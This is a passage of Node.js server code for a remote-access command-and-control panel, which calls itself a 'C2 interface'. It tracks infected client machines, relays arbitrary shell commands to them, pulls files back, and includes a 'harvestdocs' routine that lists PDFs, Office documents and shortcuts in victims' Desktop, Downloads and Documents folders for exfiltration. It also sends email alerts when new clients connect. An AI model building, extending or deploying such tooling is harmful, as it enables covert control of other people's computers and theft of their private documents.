  });
  
  socket.on('close', () => {
    console.log(`[TCP] Client disconnected: ${clientIP}`);

    const client = clients.get(clientId);
    
    // Update database
    if (client) {
      closeClientSession(client.sessionId);
      markClientOffline(clientId);
    }
    // If a download was in progress, finalize it
    if (client && client.pendingDownload && client.pendingDownload.inProgress) {
      try {
        if (client.pendingDownload.timeout) clearTimeout(client.pendingDownload.timeout);
        const buf = client.pendingDownload.buffer || Buffer.alloc(0);
        const filename = path.basename(client.pendingDownload.filename || `download_${Date.now()}`);
        const downloadPath = path.join('downloads', filename);
        const resolveShortcuts = client.pendingDownload.resolveShortcuts;
        
        if (buf.length > 0) {
          fs.writeFileSync(downloadPath, buf);
          console.log(`[TCP] File downloaded (on close): ${downloadPath} (${buf.length} bytes)`);
          io.emit('fileDownloaded', { clientId, filename, path: downloadPath, size: buf.length });
          io.emit('commandResponse', { clientId, response: `Download complete -> ${downloadPath}` , timestamp: new Date() });
          
          // Check if this is a ZIP file with shortcut resolution enabled
          if (resolveShortcuts && filename.toLowerCase().endsWith('.zip')) {
            console.log('[SHORTCUT] ZIP file downloaded, processing shortcuts...');
            // Process shortcuts in the background
            setTimeout(() => {
              extractAndResolveShortcuts(downloadPath, clientId, socket);
            }, 3000); // Wait 3 seconds after ZIP download
          }
          // Check if this is a single .lnk file
          else if (filename.toLowerCase().endsWith('.lnk')) {
            console.log('[SHORTCUT] Shortcut file downloaded, resolving...');
            // Process single shortcut in the background
            setTimeout(() => {
              resolveSingleShortcut(downloadPath, clientId, socket);
            }, 1000); // Wait 1 second after shortcut download
          }
        }
      } catch (e) {
        console.error('[TCP] Error saving downloaded file on close:', e);
      } finally {
        client.pendingDownload = null;
      }
    }

    if (client) {
      client.active = false;
      io.emit('clientDisconnected', { id: clientId });
    }
  });
  
  socket.on('error', (error) => {
    // Common network noise like ECONNRESET shouldn't crash or spam
    if (error && (error.code === 'ECONNRESET' || error.code === 'EPIPE')) {
      console.warn(`[TCP] Socket error (${error.code}) for ${clientIP}`);
      return;
    }
    console.error(`[TCP] Socket error for ${clientIP}:`, error);
  });
  });
  return tcpServer;
}

function startTcpServer(host, port) {
  return new Promise((resolve, reject) => {
    const srv = createTcpServer();
    // Attach error handler BEFORE listen to avoid race on immediate DNS errors
    srv.on('error', reject);
    srv.listen(port, host, () => {
      console.log(`[TCP] Server listening on ${host}:${port}`);
      resolve();
    });
  });
}

async function restartTcpServerIfNeeded(newHost, newPort) {
  let addr = null;
  if (tcpServer && typeof tcpServer.address === 'function') {
    try {
      addr = tcpServer.address();
    } catch (e) {
      addr = null;
    }
  }
  const currentHost = (addr && addr.address) ? addr.address : '0.0.0.0';
  const currentPort = (addr && addr.port) ? addr.port : null;
  if (currentPort === newPort && currentHost === newHost) return;
  if (tcpServer) {
    await new Promise((r) => tcpServer.close(r));
    tcpServer = null;
  }
  try {
    await startTcpServer(newHost, newPort);
  } catch (e) {
    if (e && (e.code === 'ENOTFOUND' || e.code === 'EADDRNOTAVAIL')) {
      console.warn(`[TCP] Failed to bind to ${newHost}:${newPort} (${e.code}). Falling back to 0.0.0.0`);
      await startTcpServer('0.0.0.0', newPort);
    } else {
      throw e;
    }
  }
}

// Start TCP server with settings (env overrides allowed)
(async () => {
  await loadDb();
  const s = getAllSettings();
  const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
  const tcpPort = Number(process.env.TCP_PORT || s.serverPort || 2026);
  try {
    await startTcpServer(tcpHost, tcpPort);
  } catch (e) {
    if (e && (e.code === 'ENOTFOUND' || e.code === 'EADDRNOTAVAIL')) {
      console.warn(`[TCP] Failed to bind to ${tcpHost}:${tcpPort} (${e.code}). Falling back to 0.0.0.0`);
      await startTcpServer('0.0.0.0', tcpPort);
    } else {
      throw e;
    }
  }
})();

// ---- Auth helpers ----
function getUser(username) {
  const stmt = db.prepare('SELECT username, passwordHash, role FROM users WHERE username = ?');
  const row = stmt.getAsObject([username]);
  if (!row || !row.username) return null;
  return row;
}

function requireAuth(req, res, next) {
  const header = req.headers['authorization'] || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return res.status(401).json({ error: 'Missing token' });
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    req.user = payload;
    return next();
  } catch (e) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Public login endpoint
app.post('/api/login', async (req, res) => {
  await loadDb();
  const body = req.body || {};
  const username = body.username || '';
  const password = body.password || '';
  if (!username || !password) return res.status(400).json({ error: 'username and password required' });
  const user = getUser(username);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  const ok = bcrypt.compareSync(password, user.passwordHash);
  if (!ok) return res.status(401).json({ error: 'Invalid credentials' });
  const token = jwt.sign({ sub: user.username, role: user.role }, JWT_SECRET, { expiresIn: '12h' });
  res.json({ token });
});

// Protect API routes after this middleware
app.use((req, res, next) => {
  if (req.path.startsWith('/api/') && req.path !== '/api/login') {
    return requireAuth(req, res, next);
  }
  return next();
});

// Socket authentication
io.use((socket, next) => {
  const auth = socket.handshake && socket.handshake.auth;
  const query = socket.handshake && socket.handshake.query;
  const headers = socket.handshake && socket.handshake.headers;
  let token = auth && auth.token;
  if (!token && query && typeof query.token === 'string') token = query.token;
  if (!token && headers && typeof headers.authorization === 'string' && headers.authorization.startsWith('Bearer ')) {
    token = headers.authorization.slice(7);
  }
  if (!token) {
    // Allow anonymous GUI sockets; restrict-sensitive actions elsewhere
    socket.user = { sub: 'anonymous' };
    return next();
  }
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    socket.user = payload;
    return next();
  } catch (e) {
    // Fall back to anonymous instead of rejecting connection
    socket.user = { sub: 'anonymous' };
    return next();
  }
});

// WebSocket connections for GUI
io.on('connection', (socket) => {
  console.log('[WebSocket] GUI client connected');
  
  // Send current clients list
  const clientsList = Array.from(clients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    username: client.username,
    macAddress: client.macAddress,
    ip: client.ip,
    connectedAt: client.connectedAt,
    lastSeen: client.lastSeen,
    active: client.active
  }));
  
  socket.emit('clientsList', clientsList);
  
  // Provide clients list on demand
  socket.on('getClients', () => {
    const list = Array.from(clients.values()).map(client => ({
      id: client.id,
      hostname: client.hostname,
      username: client.username,
      macAddress: client.macAddress,
      ip: client.ip,
      connectedAt: client.connectedAt,
      lastSeen: client.lastSeen,
      active: client.active
    }));
    socket.emit('clientsList', list);
  });
  
  // Handle command execution
  socket.on('executeCommand', (data) => {
    const { clientId, command } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        // Handle special shortcut resolution command
        if (typeof command === 'string' && command.trim().toLowerCase() === 'resolveshortcuts') {
          io.emit('commandResponse', { 
            clientId, 
            response: '[SHORTCUT] Scanning downloads folder for shortcuts...', 
            timestamp: new Date() 
          });
          
          // Scan downloads folder for .lnk files
          const downloadsDir = path.join(__dirname, 'downloads');
          if (fs.existsSync(downloadsDir)) {
            const files = fs.readdirSync(downloadsDir);
            const lnkFiles = files.filter(file => file.toLowerCase().endsWith('.lnk'));
            
            if (lnkFiles.length > 0) {
              io.emit('commandResponse', { 
                clientId, 
                response: `[SHORTCUT] Found ${lnkFiles.length} shortcut files to resolve`, 
                timestamp: new Date() 
              });
              
              // Process each shortcut
              lnkFiles.forEach((lnkFile, index) => {
                setTimeout(() => {
                  const lnkPath = path.join(downloadsDir, lnkFile);
                  resolveSingleShortcut(lnkPath, clientId, client.socket);
                }, index * 2000); // 2 second delay between each
              });
            } else {
              io.emit('commandResponse', { 
                clientId, 
                response: '[SHORTCUT] No shortcut files found in downloads folder', 
                timestamp: new Date() 
              });
            }
          }
          return;
        }
        
        // Handle special document harvesting command
        if (typeof command === 'string' && command.trim().toLowerCase() === 'harvestdocs') {
          io.emit('commandResponse', { 
            clientId, 
            response: '[HARVEST] Starting document harvesting from system folders...', 
            timestamp: new Date() 
          });
          
          // Define folders to scan
          const foldersToScan = [
            '%USERPROFILE%\\Desktop',
            '%USERPROFILE%\\Downloads', 
            '%USERPROFILE%\\Documents',
            '%PUBLIC%\\Desktop',
            '%PUBLIC%\\Downloads',
            '%PUBLIC%\\Documents'
          ];
          
          const fileExtensions = ['*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx', '*.lnk'];
          
          io.emit('commandResponse', { 
            clientId, 
            response: `[HARVEST] Scanning ${foldersToScan.length} system folders for documents...`, 
            timestamp: new Date() 
          });
          
          // Send commands to list files in each folder
          foldersToScan.forEach((folder, index) => {
            setTimeout(() => {
              fileExtensions.forEach((ext, extIndex) => {
                setTimeout(() => {
                  const listCmd = {
                    type: 'command',
                    content: `dir /b /s "${folder}\\${ext}" 2>nul`
                  };
                  client.socket.write(JSON.stringify(listCmd) + '\n');
                }, extIndex * 300);
              });
            }, index * 2500);
          });
          
          io.emit('commandResponse', { 
            clientId, 
            response: '[HARVEST] Scan initiated. Documents will be listed shortly. Use "download <path>" to get them.', 
            timestamp: new Date() 
          });
          
          return;
        }
        
        // If user is downloading via terminal, prepare pending download capture
        if (typeof command === 'string' && command.trim().toLowerCase().startsWith('download ')) {
          client.pendingDownload = {
            inProgress: true,
            filename: command.trim().slice('download '.length),
            buffer: Buffer.alloc(0),
            timeout: null
          };
        }
        const commandData = {
          type: 'command',
          content: command
        };
        
        client.socket.write(JSON.stringify(commandData));
        
        // Store command in history
        const session = clientSessions.get(clientId) || [];
        session.push({
          timestamp: new Date(),
          type: 'command',
          content: command
        });
        clientSessions.set(clientId, session);
        
        // Log command to database
        if (client.sessionId) {
          logClientCommand(clientId, client.sessionId, command);
        }
        
        commandHistory.push({
          id: uuidv4(),
          clientId: clientId,
          command: command,
          timestamp: new Date()
        });
        
        // Notify GUI
        socket.emit('commandSent', {
          clientId: clientId,
          command: command,
          timestamp: new Date()
        });
        
      } catch (error) {
        console.error('Error sending command:', error);
        socket.emit('commandError', { error: error.message });
      }
    } else {
      socket.emit('commandError', { error: 'Client not found or inactive' });
    }
  });
  
  // Handle file upload
  socket.on('uploadFile', (data) => {
    const { clientId, filename } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: `upload ${filename}`
        };
        
        client.socket.write(JSON.stringify(commandData));
        socket.emit('uploadInitiated', { clientId, filename });
      } catch (error) {
        socket.emit('uploadError', { error: error.message });
      }
    }
  });
  
  // Handle file download
  socket.on('downloadFile', (data) => {
    const { clientId, filename } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: `download ${filename}`
        };
        
        // mark this client as expecting a download stream
        client.pendingDownload = {
          inProgress: true,
          filename,
          buffer: Buffer.alloc(0),
          timeout: null
        };

        client.socket.write(JSON.stringify(commandData));
        socket.emit('downloadInitiated', { clientId, filename });
      } catch (error) {
        socket.emit('downloadError', { error: error.message });
      }
    }
  });
  
  // Get client session history
  socket.on('getClientHistory', (clientId) => {
    const session = clientSessions.get(clientId) || [];
    socket.emit('clientHistory', { clientId, history: session });
  });
  
  // Get command history
  socket.on('getCommandHistory', () => {
    socket.emit('commandHistory', commandHistory);
  });
  
  // Delete a disconnected client from memory
  socket.on('deleteClient', (data) => {
    try {
      const clientId = typeof data === 'string' ? data : (data && data.clientId);
      if (!clientId) return socket.emit('clientDeleteError', { error: 'clientId required' });
      const client = clients.get(clientId);
      if (!client) return socket.emit('clientDeleteError', { error: 'Client not found' });
      if (client.active) return socket.emit('clientDeleteError', { error: 'Cannot delete active client' });
      // Clean up maps
      clients.delete(clientId);
      clientSessions.delete(clientId);
      // Notify all GUI clients
      io.emit('clientRemoved', { id: clientId });
    } catch (e) {
      socket.emit('clientDeleteError', { error: e.message || 'Delete failed' });
    }
  });
  
  socket.on('disconnect', () => {
    console.log('[WebSocket] GUI client disconnected');
  });
});

// API Routes
app.get('/api/settings', async (req, res) => {
  await loadDb();
  res.json(getAllSettings());
});

app.put('/api/settings', async (req, res) => {
  await loadDb();
  const body = req.body || {};
  setSettings(body);
  // Hot-restart TCP server if host/port changed
  const s = getAllSettings();
  try {
    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 2026);
    res.json({ ok: true });
  } catch (e) {
    console.error('Failed to restart TCP server:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});
app.get('/api/password', async (req, res) => {
  await loadDb();
  const val = getSetting('encryptionPassword', '');
  res.json({ password: val || '' });
});
app.post('/api/password', async (req, res) => {
  await loadDb();
  const body = req.body || {};
  const pwd = (body.password || '').toString();
  if (!pwd) return res.status(400).json({ ok: false, error: 'password required' });
  setSettings({ encryptionPassword: pwd });
  res.json({ ok: true });
});
app.get('/api/clients', async (req, res) => {
  await loadDb();
  
  // Get currently connected clients
  const activeClients = Array.from(clients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    username: client.username,
    macAddress: client.macAddress,
    os: client.os,
    ip: client.ip,
    connectedAt: client.connectedAt,
    lastSeen: client.lastSeen,
    active: client.active,
    status: 'online'
  }));
  
  // Get all clients from database
  const dbClients = getAllClientsFromDb();
  
  // Merge active clients with database clients
  const clientsMap = new Map();
  
  // Add database clients first
  dbClients.forEach(dbClient => {
    clientsMap.set(dbClient.id, {
      ...dbClient,
      connectedAt: dbClient.firstSeen,
      status: dbClient.status || 'offline'
    });
  });
  
  // Override with active client data
  activeClients.forEach(activeClient => {
    clientsMap.set(activeClient.id, activeClient);
  });
  
  const mergedClients = Array.from(clientsMap.values());
  res.json(mergedClients);
});

app.get('/api/clients/:id/history', async (req, res) => {
  await loadDb();
  
  const clientId = req.params.id;
  
  // Get current session data
  const currentSession = clientSessions.get(clientId) || [];
  
  // Get historical data from database
  const history = getClientHistory(clientId);
  
  res.json({
    currentSession: currentSession,
    sessions: history.sessions,
    commands: history.commands
  });
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  res.json({
    message: 'File uploaded successfully',
    filename: req.file.filename,
    originalName: req.file.originalname,
    path: req.file.path
  });
});

app.get('/api/downloads', (req, res) => {
  try {
    const downloadsDir = 'downloads';
    if (!fs.existsSync(downloadsDir)) {
      return res.json([]);
    }
    
    const files = fs.readdirSync(downloadsDir).map(filename => {
      const filePath = path.join(downloadsDir, filename);
      const stats = fs.statSync(filePath);
      return {
        filename,
        size: stats.size,
        modified: stats.mtime,
        path: filePath
      };
    });
    
    res.json(files);
  } catch (error) {
    res.status(500).json({ error: 'Failed to list downloads' });
  }
});

app.get('/api/downloads/:filename', (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join('downloads', filename);
  
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

// Email configuration endpoints
app.get('/api/email/status', (req, res) => {
  const settings = getAllSettings();
  res.json({
    emailEnabled: settings.emailEnabled,
    emailUser: settings.emailUser,
    emailHost: settings.emailHost,
    emailPort: settings.emailPort,
    emailTo: settings.emailTo,
    emailFrom: settings.emailFrom,
    emailSubject: settings.emailSubject
  });
});

app.post('/api/email/settings', async (req, res) => {
  try {
    const body = req.body || {};
    const emailSettings = {
      emailEnabled: Boolean(body.emailEnabled),
      emailHost: body.emailHost || 'smtp.gmail.com',
      emailPort: Number(body.emailPort) || 587,
      emailSecure: Boolean(body.emailSecure),
      emailUser: body.emailUser || '',
      emailPass: body.emailPass || '',
      emailFrom: body.emailFrom || body.emailUser || '',
      emailTo: Array.isArray(body.emailTo) ? body.emailTo : [],
      emailSubject: body.emailSubject || 'C2 Client Connection Alert'
    };

    // Validate required fields if email is enabled
    if (emailSettings.emailEnabled) {
      if (!emailSettings.emailUser || !emailSettings.emailPass) {
        return res.status(400).json({ 
          error: 'Email user and password are required when email is enabled' 
        });
      }
      if (!emailSettings.emailTo || emailSettings.emailTo.length === 0) {
        return res.status(400).json({ 
          error: 'At least one recipient email address is required' 
        });
      }
    }

    setSettings(emailSettings);
    
    // Reset transporter with new settings
    emailTransporter = null;
    if (emailSettings.emailEnabled) {
      emailTransporter = createEmailTransporter();
    }

    res.json({ success: true, message: 'Email settings updated successfully' });
  } catch (error) {
    console.error('[EMAIL] Failed to update email settings:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Failed to update email settings: ' + error.message 
    });
  }
});

// Serve React app
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
});

const HOST = process.env.HOST || '0.0.0.0';
const PORT = Number(process.env.PORT || 5000);
server.listen(PORT, HOST, () => {
  console.log(`[HTTP] Server running on ${HOST}:${PORT}`);
  console.log(`[GUI] Access the C2 interface at: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
});